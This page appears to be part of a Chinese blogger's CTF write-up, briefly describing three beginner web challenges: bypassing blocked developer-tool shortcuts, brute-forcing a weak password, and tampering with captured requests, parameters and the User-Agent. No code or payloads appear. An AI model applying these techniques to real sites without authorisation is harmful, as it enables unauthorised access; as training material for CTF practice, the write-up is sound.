<h3 id="我真得控制你了"><a href="#我真得控制你了" class="headerlink" title="我真得控制你了"></a>我真得控制你了</h3><p>一上来就是禁止使用各种快捷键进入开发者页面 但依旧可以使用右上角菜单栏开启<br>将按钮前方的div元素用控制栏编辑修改掉即可 点击进入下一关<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="6ee40a743a525692d9124686fd2fa061.png" alt="6ee40a743a525692d9124686fd2fa061"><br>下一关是弱口令密码爆破 这里直接破解即可<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="1d6b738a1be46323242f87cc892598c2.png" alt="1d6b738a1be46323242f87cc892598c2"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="f634553fb563bc94703e01d80646f18c.png" alt="f634553fb563bc94703e01d80646f18c"><br>进去之后给你该页面的php源码 叫你分析后通过?newstar来get传参 输入指定通关代码即可获取flag<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="3.png" alt="3"></p>
<h3 id="黑客小W的故事（1）"><a href="#黑客小W的故事（1）" class="headerlink" title="黑客小W的故事（1）"></a>黑客小W的故事（1）</h3><p>安装提示走流程<br>第一关是抓包 把count改成800 过关<br>第二关是get传参蘑菇孢子 post传参骨钉<br>第三关是在user agent中输入技能名<br>然后直接获取flag</p>
<h3 id="宇宙的中心是php"><a href="#宇宙的中心是php" class="headerlink" title="宇宙的中心是php"></a>宇宙的中心是php</h3><p>页面html代码注释中潜藏目录 进入后发现php代码 post传参即可<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="4.png" alt="4"></p>
<h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote>
<p>We are just another visitor in a transient world.</p>
</blockquote>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/cover/2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%87%AA%E5%AD%A6%E7%9B%B8%E5%85%B3/" title="数据结构C++自学相关"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">数据结构C++自学相关</div></div><div class="info-2"><div class="info-item-1">该文章还在编辑中... 估计等期末就能完结 （已完结！）</div></div></div></a><a class="pagination-related" href="/2025/09/24/%E4%B8%89%E6%AC%BEsteam%E7%95%AA%E8%8C%84%E9%92%9F%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/" title="三款steam付费番茄钟软件测评"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">三款steam付费番茄钟软件测评</div></div><div class="info-2"><div class="info-item-1">对于steam上的仨沉浸式环境番茄钟 gogh:虚拟形象与专注/Spirit City:Lofi Sessions/Chill Pulse 心流小筑 的测评（进度3/3） 完事了 还有别的后边再加</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/" title="BaseCTF高校联合新生赛2024"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-16</div><div class="info-item-2">BaseCTF高校联合新生赛2024</div></div><div class="info-2"><div class="info-item-1">已经收到Kengwang的礼物啦鉴于某些不可明说的原因 第二周开始就放官方writeup 并作为自主练习 不主动参赛了目前更新到了第一周的writeup 第一周-我们的writeup这里是队伍0penness在BaseCTF 高校联合新生赛中对于题目的相关解答&amp;writeup爱来自猫涅&amp;真理教教主 Misc[Week1] 你也喜欢圣物吗解压之后得到了一张图和压缩包压缩包有密码保护 那么密码铁定就在这张图里边放入stegsolve 解析图片一眼base加密 拿去解码结果是个小提示 说明该图片经过了LSB加密解密后翻到最上边确实有隐藏信息用这段key打开压缩包里面照样藏了个加...</div></div></div></a><a class="pagination-related" href="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/" title="CTF实战相关2"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-12</div><div class="info-item-2">CTF实战相关2</div></div><div class="info-2"><div class="info-item-1">CTF实战相关2以web类的CTF作为范本的话应该做的  1.检查网页元素 寻找相关提示2.通过网络查看http标头(header)3.burp扫描&#x2F;hackbar投送信息&#x2F;更改cookie4.php相关知识  还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer简单来说X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问Referer代表了你是从哪个网页来——例如http://www.google.com 例题（注：这里图片只附上结果 主要是不想再开环境了）使用了谷歌浏览器的f12功能 burpsu...</div></div></div></a><a class="pagination-related" href="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/" title="ctf实战相关1"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-06</div><div class="info-item-2">ctf实战相关1</div></div><div class="info-2"><div class="info-item-1">本次主题为 [ACTF2020 新生赛]BackupFile 与 [极客大挑战 2019]BuyFlag 使用平台chromebuuctffirefox(搭载hackbar) 相关知识备份文件的存在cookie查看&#x2F;修改php数据类型 flag获取过程1.[ACTF2020 新生赛]BackupFile总之 一进去 啥都没有f12注释也没藏我们换个思路 既然题目内容点了题 那么解题方案注定和backup file有关多半只能扫目录了 于是用dirsearch和dirb搜索相关的目录最后发现是潜藏在主页的.bak(每个页面都会有的备份页面)之中👆关于.bak文件的相关解释目录后...</div></div></div></a><a class="pagination-related" href="/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/" title="夺旗时间"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-08</div><div class="info-item-2">夺旗时间</div></div><div class="info-2"><div class="info-item-1">三个月的假期准确来说还没到 在这之前 预热一下CTF的学习 CTF题目类别-Reverse-题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。-所需知识：汇编语言、加密与解密、常见反编译工具 -Pwn-Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。-所需知识：C，OD+IDA，数据结构，操作系统 -Web-Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注...</div></div></div></a><a class="pagination-related" href="/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/" title="神奇脚本在哪里-CTF之Pwn"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-26</div><div class="info-item-2">神奇脚本在哪里-CTF之Pwn</div></div><div class="info-2"><div class="info-item-1">ps:最近刚开学 很忙 会很慢的更 最近接触到了Pwn 那就来顺带讲讲Pwn吧基于我对pwn的理解 pwn的过程分别为下:1.题目在大部分情况下会提供一个文件和相应环境2.所提供文件的内容对应了环境所指向的靶机 该靶机所运行的便是该文件3.尝试通过nc 或python的pwn脚本来爆破出flag内容 （在做了的）例题[BUUCTF]test-your-nc这个题目标题就已经揭示了大部分的主要内容-用nc链接靶机i&#x2F;p获取flag   后面的等我持续更新中（逃结尾&#x2F;引用  We are just another visitor in a transient world.  </div></div></div></a><a class="pagination-related" href="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/" title="逆逆逆逆逆向-CTF之reverse"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cover/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-05</div><div class="info-item-2">逆逆逆逆逆向-CTF之reverse</div></div><div class="info-2"><div class="info-item-1">既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类关键基本都在ida pro的使用以及反编程后的信息搜集 1234567~目前来说有用的记录~shift+f12 查看字符串ctrl+X 查询该字符串对应内存的相关调用f5 查看伪c代码代码中的变量直接选中后双击就可查看具体内容alt+Tida pro的环境目录内最好是纯英文 不然会出各种各样的bug  测试题 BUUCTF-easyre1将题目提供的exe以ida pro打开ida pro会自动判断我们提供软件的类型并提供选择 这里直接点击ok软件内有很多不同的视窗 我们来主要分析他生成的视窗化代码很明...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">nirvana_felis</div><div class="author-info-description">正在思考明天中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/NirvanafeLis"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://steamcommunity.com/id/nirvana_felis/" target="_blank" title="steam"><i class="fa-brands fa-steam" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/16318603" target="_blank" title="bilibili"><i class="fa-brands fa-bilibili" style="color: #6b9bbd;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">继续更新文章/整点小活... 最终决定把记录技术和生活的部分分开 点击右上角跳转</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E7%BB%93%E6%84%9F%E8%A8%80%EF%BC%88%EF%BC%9F%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">完结感言（？）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week-5"><span class="toc-number"></span> <span class="toc-text">Week 5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%9F%E5%BC%83%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.</span> <span class="toc-text">废弃的网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8FW%E5%92%8C%E5%B0%8FK%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%88%E6%9C%80%E7%BB%88%E7%AB%A0%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">小W和小K的故事（最终章）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%BC%E7%86%9F%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">眼熟的计算器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Binary-Blog"><span class="toc-number">1.4.</span> <span class="toc-text">Binary Blog</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Smile%E7%9B%92"><span class="toc-number">2.1.</span> <span class="toc-text">Smile盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BLS%E5%A4%9A%E9%87%8D%E7%AD%BE%E5%90%8D%EF%BC%9A%E9%9B%B6%E7%9A%84%E8%A3%82%E5%8F%98"><span class="toc-number">2.2.</span> <span class="toc-text">BLS多重签名：零的裂变</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Poly"><span class="toc-number">2.3.</span> <span class="toc-text">Poly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%BB%99%E4%BD%A0%E7%9C%8B%E5%96%B5"><span class="toc-number">2.4.</span> <span class="toc-text">不给你看喵</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week-4"><span class="toc-number"></span> <span class="toc-text">Week 4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B7%E4%B9%B1%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.</span> <span class="toc-text">混乱的网站</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BE%8A%E8%B5%B0%E8%BF%B7%E5%AE%AB"><span class="toc-number">2.1.</span> <span class="toc-text">小羊走迷宫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A6%E5%8A%9F%E7%A7%98%E7%B1%8D"><span class="toc-number">2.2.</span> <span class="toc-text">武功秘籍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlupload"><span class="toc-number">2.3.</span> <span class="toc-text">sqlupload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8Fe%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-number">2.4.</span> <span class="toc-text">小e的留言板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%E5%9C%A8%E5%93%AA%E9%87%8C%EF%BC%9F"><span class="toc-number">2.5.</span> <span class="toc-text">ssti在哪里？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B1%E8%BD%AD%E8%BF%B7%E5%AE%AB"><span class="toc-number">3.1.</span> <span class="toc-text">共轭迷宫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E8%99%AB%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">3.2.</span> <span class="toc-text">天虫的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E9%87%8D%E5%AF%86%E9%92%A5%E9%94%81"><span class="toc-number">3.3.</span> <span class="toc-text">三重密钥锁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E6%97%854"><span class="toc-number">3.4.</span> <span class="toc-text">随机数之旅4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%AC%E4%B8%80%E6%97%A0%E4%BA%8C"><span class="toc-number">3.5.</span> <span class="toc-text">独一无二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week-3"><span class="toc-number"></span> <span class="toc-text">Week 3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-1"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-%E7%9B%B2%E8%BE%A8%E6%B5%B7%E8%B1%9A"><span class="toc-number">1.1.</span> <span class="toc-text">日志分析-盲辨海豚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE-%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E7%BA%A6%E5%AE%9A"><span class="toc-number">1.2.</span> <span class="toc-text">区块链-以太坊的约定</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-2"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mirror-gate"><span class="toc-number">2.1.</span> <span class="toc-text">mirror_gate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#who%E2%80%99ssti"><span class="toc-number">2.2.</span> <span class="toc-text">who’ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%B8%BD%E5%B0%8FK%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%882%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">白帽小K的故事（2）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-chain"><span class="toc-number">2.4.</span> <span class="toc-text">ez-chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8FE%E7%9A%84%E7%A7%98%E5%AF%86%E8%AE%A1%E5%88%92"><span class="toc-number">2.5.</span> <span class="toc-text">小E的秘密计划</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mygo"><span class="toc-number">2.6.</span> <span class="toc-text">mygo!!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-2"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E6%B3%84%E9%9C%B2%E7%9A%84%E7%B4%A0%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">被泄露的素数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E6%97%853"><span class="toc-number">3.2.</span> <span class="toc-text">随机数之旅3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%A7%E7%9A%87%E7%9A%84%E7%94%9F%E6%97%A5"><span class="toc-number">3.3.</span> <span class="toc-text">欧皇的生日</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CBC%E4%B9%8B%E8%88%9E"><span class="toc-number">3.4.</span> <span class="toc-text">CBC之舞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GCL"><span class="toc-number">3.5.</span> <span class="toc-text">GCL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week-2"><span class="toc-number"></span> <span class="toc-text">Week 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%BB%E5%9C%A8%E6%A0%88%E9%87%8C%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">刻在栈里的秘密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Forgotten-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Forgotten_Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Look-at-me-carefully"><span class="toc-number">2.2.</span> <span class="toc-text">Look at me carefully</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re-%E5%B0%A4%E7%9A%AE%C2%B7%E5%9F%83%E5%85%8B%E6%96%AF%E5%8E%86%E9%99%A9%E8%AE%B0%EF%BC%881%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">[re] 尤皮·埃克斯历险记（1）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-2"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC%E5%9F%8E%E9%82%A6-NewKeyboard"><span class="toc-number">3.1.</span> <span class="toc-text">MISC城邦-NewKeyboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSINT-%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">3.2.</span> <span class="toc-text">OSINT-威胁情报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-%E4%B8%8D%E6%95%AC%E8%80%85%E7%9A%84%E9%97%AF%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">日志分析-不敬者的闯入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%9F%E6%9C%9F%E5%9B%9B%E7%9A%84%E7%8B%82%E6%83%B3"><span class="toc-number">3.4.</span> <span class="toc-text">星期四的狂想</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8E%E5%A6%99%E7%9A%84%E9%9F%B3%E4%B9%90"><span class="toc-number">3.5.</span> <span class="toc-text">美妙的音乐</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-3"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%B8%BD%E5%B0%8FK%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%881%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">白帽小K的故事（1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8FE%E7%9A%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">4.2.</span> <span class="toc-text">小E的管理系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DD%E5%8A%A0%E9%80%9F%E5%99%A8"><span class="toc-number">4.3.</span> <span class="toc-text">DD加速器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9E%E7%82%B9%E5%93%A6%E6%B6%A6%E5%90%89%E5%90%83%E5%90%83%E6%A9%98"><span class="toc-number">4.4.</span> <span class="toc-text">搞点哦润吉吃吃橘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E7%9A%84%E6%98%AF%E7%AD%BE%E5%88%B0%E8%AF%B6"><span class="toc-number">4.5.</span> <span class="toc-text">真的是签到诶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-3"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%A4%E8%AE%BA%E5%B0%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">5.1.</span> <span class="toc-text">群论小测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-revenge"><span class="toc-number">5.2.</span> <span class="toc-text">RSA_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FHE-0-and-1"><span class="toc-number">5.3.</span> <span class="toc-text">FHE: 0 and 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%AE%E6%8D%A2"><span class="toc-number">5.4.</span> <span class="toc-text">置换</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week-1"><span class="toc-number"></span> <span class="toc-text">Week 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-1"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#input-function"><span class="toc-number">1.1.</span> <span class="toc-text">input_function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">1.2.</span> <span class="toc-text">overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn%E2%80%99s-door"><span class="toc-number">1.3.</span> <span class="toc-text">pwn’s door</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#INTbug"><span class="toc-number">1.4.</span> <span class="toc-text">INTbug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-challenge"><span class="toc-number">1.5.</span> <span class="toc-text">gdb_challenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-1"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#plzdebugme"><span class="toc-number">2.1.</span> <span class="toc-text">plzdebugme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzMyDroid"><span class="toc-number">2.2.</span> <span class="toc-text">EzMyDroid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Puzzle"><span class="toc-number">2.3.</span> <span class="toc-text">Puzzle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x0r"><span class="toc-number">2.4.</span> <span class="toc-text">x0r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Strange-Base"><span class="toc-number">2.5.</span> <span class="toc-text">Strange Base</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-4"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sagemath%E4%BD%BF%E7%94%A8%E6%8C%87%E5%93%AA%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">Sagemath使用指哪？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E6%97%851"><span class="toc-number">3.2.</span> <span class="toc-text">随机数之旅1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E8%AF%86rsa"><span class="toc-number">3.3.</span> <span class="toc-text">初识rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%B7%B3%E8%9B%99"><span class="toc-number">3.4.</span> <span class="toc-text">小跳蛙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%94%AF%E4%B8%80%E8%A1%A8%E7%A4%BA"><span class="toc-number">3.5.</span> <span class="toc-text">唯一表示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-3"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-%E6%88%91%E4%B8%8D%E8%A6%81%E9%9D%A9%E5%91%BD%E5%A4%B1%E8%B4%A5"><span class="toc-number">4.1.</span> <span class="toc-text">[Misc]我不要革命失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC%E5%9F%8E%E9%82%A6-%E5%8E%8B%E7%BC%A9%E6%9C%AF"><span class="toc-number">4.2.</span> <span class="toc-text">MISC城邦-压缩术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-fence"><span class="toc-number">4.3.</span> <span class="toc-text">EZ_fence</span></a></li><li 